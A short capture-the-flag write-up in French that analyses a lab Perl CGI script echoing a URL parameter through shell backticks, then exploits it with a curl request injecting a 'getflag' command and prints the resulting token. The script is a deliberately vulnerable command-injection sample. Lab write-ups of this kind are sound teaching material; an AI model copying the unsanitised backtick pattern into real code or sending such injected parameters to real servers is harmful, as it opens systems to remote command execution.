On trouve dans le dossier home un fichier perl nommé **level04.pl** contenant le code suivant:
<pre><code>#!/usr/bin/perl
# localhost:4747
use CGI qw{param};						// Permet de mettre un parametre
print "Content-type: text/html\n\n";	// Affiche sous forme HTLM
sub x {									// Fonction x
  $y = $_[0];							// Prend le premier parametre
  print `echo $y 2>&1`;					// Echo le parametre
}
x(param("x"));							// Appelle la fonction</code></pre>


On comprend donc que le perl va s'executer si l'on va sur la page IP:4747,
de plus il prend un parametre (grace a l'url) x, qu'il va echo.

<pre><code>> curl IP:4747?x=test
test
</code></pre>

On se rend compte qu'il n'y a pas de verifaction spécial quant au paramètre, nous essayons donc d'injecter une commande:

<pre><code>> curl IP:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
</code></pre>
> On echappe les **`** pour éviter de mettre le retour de la commande **getflag**, ce que l'on cherche c'est que la commande s'execute au moment du echo